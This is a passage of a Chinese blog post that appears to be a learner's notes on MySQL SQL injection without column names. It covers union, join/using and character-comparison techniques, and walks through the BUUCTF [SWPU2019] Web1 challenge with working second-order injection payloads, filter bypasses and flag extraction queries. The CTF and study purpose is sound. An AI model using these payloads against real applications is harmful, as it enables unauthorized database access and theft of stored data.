class=\"line\">+-------------+</span><br><span class=\"line\">| answer      |</span><br><span class=\"line\">| id          |</span><br><span class=\"line\">| quest       |</span><br><span class=\"line\">+-------------+</span><br><span class=\"line\">3 rows in set (0.00 sec)</span><br><span class=\"line\"></span><br><span class=\"line\">mysql&gt; select column_name from columns where table_name=&#x27;questions&#x27;; #查询某张表中所有字段的内容（由于这个库中只有一张表，所以结果一样）</span><br><span class=\"line\">+-------------+</span><br><span class=\"line\">| COLUMN_NAME |</span><br><span class=\"line\">+-------------+</span><br><span class=\"line\">| answer      |</span><br><span class=\"line\">| id          |</span><br><span class=\"line\">| quest       |</span><br><span class=\"line\">+-------------+</span><br><span class=\"line\">3 rows in set (0.00 sec)</span><br></pre></td></tr></table></figure>\n<h2 id=\"关于innodb引擎\"><a class=\"markdownIt-Anchor\" href=\"#关于innodb引擎\">#</a> 关于 InnoDb 引擎：</h2>\n<p>​\t<strong>我不知道这个具体是个什么东西，有什么用，但是还是记录一下，有条件再拿来研究看看。</strong></p>\n<p>从 MYSQL5.5.8 开始，InnoDB 成为其默认存储引擎。而在 MYSQL5.6 以上的版本中，mysql 数据库中 inndb 增加了 innodb_index_stats 和 innodb_table_stats 两张表，这两张表中都存储了数据库和其数据表的信息，但是没有存储列名。其利用方式是：mysql.innodb_index_stats 和 mysql.innodb_table_stats</p>\n<p>​\t依旧拿上面的那张表作为延时，也就是 test 库里面的 questions 这张表。</p>\n<p>​\t再<strong> mysql</strong> 这个数据库种存在两张表，里面分别存放了一些内容，例如，<strong>innodb_table_stats</strong> 这个表，存放的是所有的表名，也就是<strong> database_name</strong> 还有<strong> table_name</strong> 这两张表，但是没有存放列名，因此，这里可以试着访问下：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">mysql&gt; select * from innodb_table_stats where database_name=&#x27;ctfer&#x27;;</span><br><span class=\"line\">+---------------+------------+---------------------+--------+----------------------+--------------------------+</span><br><span class=\"line\">| database_name | table_name | last_update         | n_rows | clustered_index_size | sum_of_other_index_sizes |</span><br><span class=\"line\">+---------------+------------+---------------------+--------+----------------------+--------------------------+</span><br><span class=\"line\">| ctfer         | users      | 2024-03-02 16:37:10 |      0 |                    1 |                        0 |</span><br><span class=\"line\">+---------------+------------+---------------------+--------+----------------------+--------------------------+</span><br><span class=\"line\">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure>\n<p>​\t再然后就是<strong> mysql</strong> 数据库中的<strong> innodb_index_stats</strong> 表，里面我总结不出来具体是什么信息，但是里面存放有所有数据库中的所有表的信息，也就是<strong> database_name</strong> 还有<strong> table_name</strong> 这两张表，不过，还是没有存放字段的信息，这里可以试着访问下：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">mysql&gt; select * from innodb_index_stats where database_name=&#x27;ctfer&#x27;;</span><br><span class=\"line\">+---------------+------------+-----------------+---------------------+--------------+------------+-------------+-----------------------------------+</span><br><span class=\"line\">| database_name | table_name | index_name      | last_update         | stat_name    | stat_value | sample_size | stat_description                  |</span><br><span class=\"line\">+---------------+------------+-----------------+---------------------+--------------+------------+-------------+-----------------------------------+</span><br><span class=\"line\">| ctfer         | users      | GEN_CLUST_INDEX | 2024-03-02 16:37:10 | n_diff_pfx01 |          0 |           1 | DB_ROW_ID                         |</span><br><span class=\"line\">| ctfer         | users      | GEN_CLUST_INDEX | 2024-03-02 16:37:10 | n_leaf_pages |          1 |        NULL | Number of leaf pages in the index |</span><br><span class=\"line\">| ctfer         | users      | GEN_CLUST_INDEX | 2024-03-02 16:37:10 | size         |          1 |        NULL | Number of pages in the index      |</span><br><span class=\"line\">+---------------+------------+-----------------+---------------------+--------------+------------+-------------+-----------------------------------+</span><br><span class=\"line\">3 rows in set (0.00 sec)</span><br></pre></td></tr></table></figure>\n<h2 id=\"关于sys数据库\"><a class=\"markdownIt-Anchor\" href=\"#关于sys数据库\">#</a> 关于 sys 数据库：</h2>\n<p>在 5.7 以上的 MYSQL 中，新增了 sys 数据库，该库的基础数据来自 information_schema 和 performance_chema，其本身不存储数据。可以通过其中的 schema_auto_increment_columns 来获取表名。其用法是 sys.schema_auto_increment_columns</p>\n<p>​\t在<strong> sys</strong> 数据库种，存在一个<strong> schema_auto_increment_columns</strong> 表，里面存在几个字段，用于存放数据库名和表名以及字段名，有<strong> table_schema</strong> 以及<strong> table_name</strong> 还有<strong> column_name</strong>，但是，不知道为啥，<strong>我这里查询到的内容并不完全，少了很多内容，不过还是先仍在这儿吧</strong></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">mysql&gt; select * from schema_auto_increment_columns;</span><br><span class=\"line\">+--------------+------------+--------------+-----------+--------------------+-----------+-------------+------------+----------------+----------------------+</span><br><span class=\"line\">| table_schema | table_name | column_name  | data_type | column_type        | is_signed | is_unsigned | max_value  | auto_increment | auto_increment_ratio |</span><br><span class=\"line\">+--------------+------------+--------------+-----------+--------------------+-----------+-------------+------------+----------------+----------------------+</span><br><span class=\"line\">| sakila       | payment    | payment_id   | smallint  | smallint unsigned  |         0 |           1 |      65535 |          16049 |               0.2449 |</span><br><span class=\"line\">| sakila       | category   | category_id  | tinyint   | tinyint unsigned   |         0 |           1 |        255 |             16 |               0.0627 |</span><br><span class=\"line\">| sakila       | language   | language_id  | tinyint   | tinyint unsigned   |         0 |           1 |        255 |              6 |               0.0235 |</span><br><span class=\"line\">| sakila       | film       | film_id      | smallint  | smallint unsigned  |         0 |           1 |      65535 |           1000 |               0.0153 |</span><br><span class=\"line\">| sakila       | address    | address_id   | smallint  | smallint unsigned  |         0 |           1 |      65535 |            605 |               0.0092 |</span><br><span class=\"line\">| sakila       | city       | city_id      | smallint  | smallint unsigned  |         0 |           1 |      65535 |            600 |               0.0092 |</span><br><span class=\"line\">| sakila       | customer   | customer_id  | smallint  | smallint unsigned  |         0 |           1 |      65535 |            599 |               0.0091 |</span><br><span class=\"line\">| sakila       | staff      | staff_id     | tinyint   | tinyint unsigned   |         0 |           1 |        255 |              2 |               0.0078 |</span><br><span class=\"line\">| sakila       | store      | store_id     | tinyint   | tinyint unsigned   |         0 |           1 |        255 |              2 |               0.0078 |</span><br><span class=\"line\">| sakila       | actor      | actor_id     | smallint  | smallint unsigned  |         0 |           1 |      65535 |            200 |               0.0031 |</span><br><span class=\"line\">| sakila       | country    | country_id   | smallint  | smallint unsigned  |         0 |           1 |      65535 |            109 |               0.0017 |</span><br><span class=\"line\">| sakila       | inventory  | inventory_id | mediumint | mediumint unsigned |         0 |           1 |   16777215 |           4581 |               0.0003 |</span><br><span class=\"line\">| sakila       | rental     | rental_id    | int       | int                |         1 |           0 | 2147483647 |          16049 |               0.0000 |</span><br><span class=\"line\">| world        | city       | ID           | int       | int                |         1 |           0 | 2147483647 |           4079 |               0.0000 |</span><br><span class=\"line\">+--------------+------------+--------------+-----------+--------------------+-----------+-------------+------------+----------------+----------------------+</span><br><span class=\"line\">14 rows in set (0.01 sec)</span><br></pre></td></tr></table></figure>\n<h2 id=\"无列名注入union\"><a class=\"markdownIt-Anchor\" href=\"#无列名注入union\">#</a> 无列名注入–union：</h2>\n<h3 id=\"原理\"><a class=\"markdownIt-Anchor\" href=\"#原理\">#</a> 原理：</h3>\n<p>​\t例如，对于如下的一个表：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">mysql&gt; select * from users；</span><br><span class=\"line\">+----------+-----------+-----------------------------------+</span><br><span class=\"line\">| username | password  | flag                              |</span><br><span class=\"line\">+----------+-----------+-----------------------------------+</span><br><span class=\"line\">| xiaomi   | qwe123456 | flag&#123;1_Am_X1a0m1_Th1s_1s_My_Fl4g&#125; |</span><br><span class=\"line\">+----------+-----------+-----------------------------------+</span><br><span class=\"line\">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure>\n<p>​\t如果我们想要进行查询，那么则需要表明，甚至是库名，不过，可以通过 table_schema=database () 来指定库名，因此，想要查询内容，则表名似乎成为了必须的内容，但是，在进行 sql 注入的时候，有的时候会对 information 进行过滤，因此，则无法做题，那么，这里则需要利用 union 的方式进行无列名的注入。</p>\n<p>​\t如果我们想要查询到这个 flag 的话，那么我们或许可以考虑将字段修改为我们能够查询到的字段，比如，1、2、3，所以，使用如下命令做个尝试：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">mysql&gt; select 1,2,3;</span><br><span class=\"line\">+---+---+---+</span><br><span class=\"line\">| 1 | 2 | 3 |</span><br><span class=\"line\">+---+---+---+</span><br><span class=\"line\">| 1 | 2 | 3 |</span><br><span class=\"line\">+---+---+---+</span><br><span class=\"line\">1 row in set (0.00 sec)</span><br><span class=\"line\"></span><br><span class=\"line\">mysql&gt; select 1,2,3  union select * from users;</span><br><span class=\"line\">+--------+-----------+-----------------------------------+</span><br><span class=\"line\">| 1      | 2         | 3                                 |</span><br><span class=\"line\">+--------+-----------+-----------------------------------+</span><br><span class=\"line\">| 1      | 2         | 3                                 |</span><br><span class=\"line\">| xiaomi | qwe123456 | flag&#123;1_Am_X1a0m1_Th1s_1s_My_Fl4g&#125; |</span><br><span class=\"line\">+--------+-----------+-----------------------------------+</span><br><span class=\"line\">2 rows in set (0.00 sec)</span><br></pre></td></tr></table></figure>\n<p>​\t可以知道的是，这里通过两次查询，第一次查询了 1，2，3 三个字段，第二次查询了 users 表中的所有字段，然后将 users 表中的所有字段联合在第一次查询到的字段中输出出来，根据这种情况，下面则有两种方式查询到 flag 的值：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">mysql&gt; select `3` from (select 1,2,3 union select * from users)a; #联合了1，2，3之后，如果用数字查询的话需要用反引号来表示引用，而不是一个值</span><br><span class=\"line\">+-----------------------------------+</span><br><span class=\"line\">| 3                                 |</span><br><span class=\"line\">+-----------------------------------+</span><br><span class=\"line\">| 3                                 |</span><br><span class=\"line\">| flag&#123;1_Am_X1a0m1_Th1s_1s_My_Fl4g&#125; |</span><br><span class=\"line\">+-----------------------------------+</span><br><span class=\"line\">2 rows in set (0.00 sec)</span><br><span class=\"line\"></span><br><span class=\"line\">mysql&gt; select b from (select 1,2,3 as b union select * from users)a; #这里通过3 as b 的方式给字段3重命名为b，然后再进行插叙</span><br><span class=\"line\">+-----------------------------------+</span><br><span class=\"line\">| b                                 |</span><br><span class=\"line\">+-----------------------------------+</span><br><span class=\"line\">| 3                                 |</span><br><span class=\"line\">| flag&#123;1_Am_X1a0m1_Th1s_1s_My_Fl4g&#125; |</span><br><span class=\"line\">+-----------------------------------+</span><br><span class=\"line\">2 rows in set (0.00 sec)</span><br></pre></td></tr></table></figure>\n<p><strong>注：这里不知道为何需要在括号外面随意写一些字符，如果有知道的话请帮忙讲解一下。</strong></p>\n<h3 id=\"题目案例buuctf-swpu2019web1\"><a class=\"markdownIt-Anchor\" href=\"#题目案例buuctf-swpu2019web1\">#</a> 题目案例–BUUCTF----[SWPU2019] Web1：</h3>\n<p>​\t刚拿到这道题的时候，我是一点儿思路都没有，全称黑人问号，即使这道这道题的考点是 sql 注入也是一样的，完全找不到下手的点。</p>\n<p><img data-src=\"https://img-blog.csdnimg.cn/direct/3e1023f3f67e4d3fac843a2f1486c2a9.png#pic_center\" alt=\"在这里插入图片描述\"></p>\n<p>​\t最开始，一个登陆框一度让我认为是 sql 注入的万能密码，结果不是，弱密码？猜了几个也没才出来，因此，可以排除是弱密码以及万能密码了，跟着 dalao 们的 wp 做，发现这里可以直接注册一个非 admin 的账号，好吧，我人傻了，那就随便注册一下，账号 qwe，密码 123456，登录。</p>\n<p>​\t登录之后是这样的一个内容：</p>\n<p><img data-src=\"https://img-blog.csdnimg.cn/direct/093d175444854bd3988bb876439407a9.png#pic_center\" alt=\"在这里插入图片描述\"></p>\n<p>​\t这里，似乎能点的超链接只有一个申请发布广告，下面那一个点了之后似乎就退出登录了，显然是错的，所以点一下申请发布广告：</p>\n<p><img data-src=\"https://img-blog.csdnimg.cn/direct/b146d1cf26474ba899ca67be5f4fca2f.png#pic_center\" alt=\"在这里插入图片描述\"></p>\n<p>​\t出现了这样的一个页面，那么，这个又代表了什么呢？如果不是明确地指出这道题是 sql 注入的话，我可能还是会无脑认为这个题目是一道 XSS 的漏洞，那么，这个到底是个啥？</p>\n<p>​\t看了下 dalao 们的 wp，说的是这是一道二次注入，是一道我没有遇到过的漏洞。</p>\n<h4 id=\"什么是二次注入\"><a class=\"markdownIt-Anchor\" href=\"#什么是二次注入\">#</a> 什么是二次注入：</h4>\n<p>​\t二次注入就是指以储存（数据库、文件）的用户输入被读取后再次进入到 SQL 查询语句中导致注入。</p>\n<h4 id=\"二次注入的原理\"><a class=\"markdownIt-Anchor\" href=\"#二次注入的原理\">#</a> 二次注入的原理：</h4>\n<p>​\t首先，对于某些字符，在进行数据库插入数据时，对其中的某些特殊字符进行了转义处理，比如 1’变成了 1\\’ 在写入数据库的时候保留了原来的数据，也就是 1’。然后，开发者又默认了存入数据库中的数据都是安全的，因此，在进行查询时，直接从数据库中取出而已树据，并没有进行进一步的检验的处理，在下一次的使用中拼凑在一起，就形成了二次注入。</p>\n<h4 id=\"继续做题\"><a class=\"markdownIt-Anchor\" href=\"#继续做题\">#</a> 继续做题：</h4>\n<p>​\t既然这道题是个二次注入的题目，那么就应该考虑，使用 sql 注入的方式了。首先构造语句，判断注入类型以及想办法清楚到底过滤了那些关键字，首先构造 sql 语句，之后申请，然后广告详情：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">1&#x27;</span><br></pre></td></tr></table></figure>\n<p>​\t得到了</p>\n<blockquote>\n<p>You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near ‘‘1’’ limit 0,1’ at line 1</p>\n</blockquote>\n<p>​\t的一个回显，通过报错信息，或许是一个字符型注入，紧接着，判断过滤，经过多次尝试，发现过滤了的有：</p>\n<blockquote>\n<p>or , # , 空格，order by ，information_schema</p>\n</blockquote>\n<p>​\t对于空格而言，则可以使用 /**/ 来绕过，order by 则可以使用 group by ，# 则可以使用，'3 来闭合后面的引号来绕过，另外，information_schema 则可以使用最开始说到的无列名注入的相关的知识了，通过<strong> InnoDb</strong> 引擎查表名，第一个 payload 为：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">1&#x27;/**/group/**/by/**/22,&#x27;3</span><br></pre></td></tr></table></figure>\n<p>​\t首先，构造的 group by 后面的整数位 22 的时候，没有出现错误，但是，当整数为 23 的时候，却出现了报错：</p>\n<p><img data-src=\"https://img-blog.csdnimg.cn/direct/3ef317d47b864de49209ed80d92d26fb.png#pic_center\" alt=\"在这里插入图片描述\"></p>\n<p>​\t大致可以推测出，字段总的有 22 个。</p>\n<p>​\t那么，知道了总的有多少个字段之后，就可以试着获得数据库名和表名了，构造的 payload 分别为：</p>\n<p>​\t首先通过构造如下 payload 获取回显点，最后发现，回显点是 2，3</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">-1&#x27;/**/union/**/select/**/1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,&#x27;22</span><br></pre></td></tr></table></figure>\n<p>​\t获得数据库名，成功拿到数据库为 web1：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">1&#x27;/**/union/**/select/**/1,database(),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22/**/&#x27; </span><br></pre></td></tr></table></figure>\n<p>​\t获得表名：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">1&#x27;/**/union/**/select/**/1,(select/**/group_concat(table_name)/**/from/**/mysql.innodb_table_stats),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22/**/&#x27;</span><br></pre></td></tr></table></figure>\n<p>​\t最后确定，web1 这个数据库中存在的表为如下：</p>\n<p><img data-src=\"https://img-blog.csdnimg.cn/direct/854b8d1498074d73a2f7023c6ab6f41f.png#pic_center\" alt=\"在这里插入图片描述\"></p>\n<p>​\t根据 dalao 们的 wp，他们使用的都是 users 这个表，因此，这里就不用一个表一个表地查了，直接 users 这个表梭哈：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">1&#x27;/**/union/**/select/**/1,\t\t(select/**/group_concat(b)/**/from/**/(select/**/1,2,3/**/as/**/b/**/union/**/select/**/*/**/from/**/users)a),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22/**/&#x27;</span><br></pre></td></tr></table></figure>\n<p>​\t该 payload 是利用了上面说到的无列名地 union 方法进行的，当然，为啥确定 users 表中存在 3 个字段呢？因为经过试错，发现一个字段，两个字段以及四个以上的时候，均是报错，所以，可以利用这一点，进行查询，然后通过</p>\n<p>​\t然后通过修改 as b 所在的地方，比如 1 的后方或者 2 的后方对列进行查找，最后发现在第三列查到了 flag：</p>\n<p><img data-src=\"https://img-blog.csdnimg.cn/direct/169fb5b613c84ef7bea030410db6f7dc.png#pic_center\" alt=\"在这里插入图片描述\"></p>\n<p>​\t完成啦  <strong>(p≧w≦q)</strong>  。</p>\n<h2 id=\"无列名注入join\"><a class=\"markdownIt-Anchor\" href=\"#无列名注入join\">#</a> 无列名注入–join：</h2>\n<p>​\t当然，由于 union 在的地位太过重要，因此有的时候可能会直接对 union 进行过滤，这个时候呢，就需要用到 join 来进行注入。</p>\n<blockquote>\n<p><strong>在那之前，先讲一下相关的前置知识，虽然我也不懂这些，不过还是先记录一下：</strong></p>\n<ul>\n<li>join 连接两张表</li>\n<li>using () 用于两张表之间的 join 连接查询，并且 using () 中的列在两张表中都存在，作为 join 的条件</li>\n</ul>\n</blockquote>\n<p>​\t首先，还是之前的那一个 ctfer 的数据库，下面通过这个数据库做几个实验：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">mysql&gt; select * from users as a join users as b;</span><br><span class=\"line\">+----------+-----------+-----------------------------------+----------+-----------+-----------------------------------+</span><br><span class=\"line\">| username | password  | flag                              | username | password  | flag                              |</span><br><span class=\"line\">+----------+-----------+-----------------------------------+----------+-----------+-----------------------------------+</span><br><span class=\"line\">| xiaomi   | qwe123456 | flag&#123;1_Am_X1a0m1_Th1s_1s_My_Fl4g&#125; | xiaomi   | qwe123456 | flag&#123;1_Am_X1a0m1_Th1s_1s_My_Fl4g&#125; |</span><br><span class=\"line\">+----------+-----------+-----------------------------------+----------+-----------+-----------------------------------+</span><br><span class=\"line\">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure>\n<p>​\t<strong>可以发现，查询的两次同一个表，被拼接成了一个</strong>，那么，这个有什么用呢？试试在这之前加上一个查询，看看查询这拼接到一起的这个表：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">mysql&gt; select * from (select * from users as a join users as b)a;</span><br><span class=\"line\">ERROR 1060 (42S21): Duplicate column name &#x27;username&#x27;</span><br></pre></td></tr></table></figure>\n<p>​\t这里发现，报错了，并且还是字段名重复的错误，<strong>注：括号外面必须得加上任意字母，否则会报 ERROR 1248 (42000): Every derived table must have its own alias 的错误</strong>，因此，则可以使用这种方式获得所有的列名，不过前提还是得用<strong> InnoDb 引擎</strong>来获取数据库名以及表名。</p>\n<p>​\t根据上面的那个可以知道的是，其中一个字段的名字，但是，flag 或许并不在这个字段里，那么，就需要想点办法获得下一个字段的名字了，不过，在那之前，得先排除掉已经知道的字段名的干扰，可以使用如下方法：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">mysql&gt; select * from users as a join users as b using(username);</span><br><span class=\"line\">+----------+-----------+-----------------------------------+-----------+-----------------------------------+</span><br><span class=\"line\">| username | password  | flag                              | password  | flag                              |</span><br><span class=\"line\">+----------+-----------+-----------------------------------+-----------+-----------------------------------+</span><br><span class=\"line\">| xiaomi   | qwe123456 | flag&#123;1_Am_X1a0m1_Th1s_1s_My_Fl4g&#125; | qwe123456 | flag&#123;1_Am_X1a0m1_Th1s_1s_My_Fl4g&#125; |</span><br><span class=\"line\">+----------+-----------+-----------------------------------+-----------+-----------------------------------+</span><br><span class=\"line\">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure>\n<p>​\t看看上面的内容，发现在增加了一个 **using (username)** 之后，username 这个字段似乎奇迹般地没了，<strong>不过这里我不是很清楚原理是什么，不过，暂时能用就行，记录一下，以后有机会学到了这里再进行补充</strong>。那么，到了这个时候，重复的字段就只有 password 和 flag 了，于是，再用如下的语句进行查询看看：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">mysql&gt; select * from (select * from users as a join users as b using(username))a;</span><br><span class=\"line\">ERROR 1060 (42S21): Duplicate column name &#x27;password&#x27;</span><br></pre></td></tr></table></figure>\n<p>​\t成功查询到了 password 这个字段名，紧接着，将 password 加入 using () 函数中，如下，即可拿到 flag 字段的字段名：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">mysql&gt; select * from (select * from users as a join users as b using(username,password))a;</span><br><span class=\"line\">ERROR 1060 (42S21): Duplicate column name &#x27;flag&#x27;</span><br></pre></td></tr></table></figure>\n<p>​\t最后一步，如果将 flag 再填进 using () 函数中呢？会出现如下情况：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">mysql&gt; select * from (select * from users as a join users as b using(username,password,flag))a;</span><br><span class=\"line\">+----------+-----------+-----------------------------------+</span><br><span class=\"line\">| username | password  | flag                              |</span><br><span class=\"line\">+----------+-----------+-----------------------------------+</span><br><span class=\"line\">| xiaomi   | qwe123456 | flag&#123;1_Am_X1a0m1_Th1s_1s_My_Fl4g&#125; |</span><br><span class=\"line\">+----------+-----------+-----------------------------------+</span><br><span class=\"line\">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure>\n<p>​\t内容被成功查询出来了，之后再怎么办就得根据题目的实际情况决定了，成功了！！！  <strong>(p≧w≦q)</strong></p>\n<h2 id=\"无列名注入ascii位偏移\"><a class=\"markdownIt-Anchor\" href=\"#无列名注入ascii位偏移\">#</a> 无列名注入–ascii 位偏移：</h2>\n<p>​\t这个方法，是有点类似于 sql 盲注的爆破的，利用的是字符串进行比较是按位置进行比较，从最开始的那个开始，一位一位地比较，因此，当得到数据库名以及表名之后，则可以进行如下操作：</p>\n<p>​\t不过这种方法有个前提，就是需要表内只有一个字段，不然只能获取到第一个字段的字段名。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">mysql&gt; select username from users;</span><br><span class=\"line\">+----------+</span><br><span class=\"line\">| username |</span><br><span class=\"line\">+----------+</span><br><span class=\"line\">| xiaomi   |</span><br><span class=\"line\">+----------+</span><br><span class=\"line\">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure>\n<p>​\t首先可以知道的是，username 中的内容是 xiaomi，因此，用如下方式可以进行比对：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">mysql&gt; select (select &#x27;x&#x27;)&gt;(select username from users);</span><br><span class=\"line\">+-------------------------------------------+</span><br><span class=\"line\">| (select &#x27;x&#x27;)&gt;(select username from users) |</span><br><span class=\"line\">+-------------------------------------------+</span><br><span class=\"line\">|                                         0 |</span><br><span class=\"line\">+-------------------------------------------+</span><br><span class=\"line\">1 row in set (0.00 sec)</span><br><span class=\"line\"></span><br><span class=\"line\">mysql&gt; select (select &#x27;y&#x27;)&gt;(select username from users);</span><br><span class=\"line\">+-------------------------------------------+</span><br><span class=\"line\">| (select &#x27;y&#x27;)&gt;(select username from users) |</span><br><span class=\"line\">+-------------------------------------------+</span><br><span class=\"line\">|                                         1 |</span><br><span class=\"line\">+-------------------------------------------+</span><br><span class=\"line\">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure>\n<p>​\t<strong>因为我这里存在三个字段，所以这里只有指定一下某个表进行查询</strong>。显而易见，在第一行中，我们用 x 进行对比，返回结果为 0，对比 y 的时候返回结果为 1，也就是说，这个字段的内容的第一位为 x，接下来进行后续的对比：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">mysql&gt; select (select &#x27;xi&#x27;)&gt;(select username from users);</span><br><span class=\"line\">+--------------------------------------------+</span><br><span class=\"line\">| (select &#x27;xi&#x27;)&gt;(select username from users) |</span><br><span class=\"line\">+--------------------------------------------+</span><br><span class=\"line\">|                                          0 |</span><br><span class=\"line\">+--------------------------------------------+</span><br><span class=\"line\">1 row in set (0.00 sec)</span><br><span class=\"line\"></span><br><span class=\"line\">mysql&gt; select (select &#x27;xj&#x27;)&gt;(select username from users);</span><br><span class=\"line\">+--------------------------------------------+</span><br><span 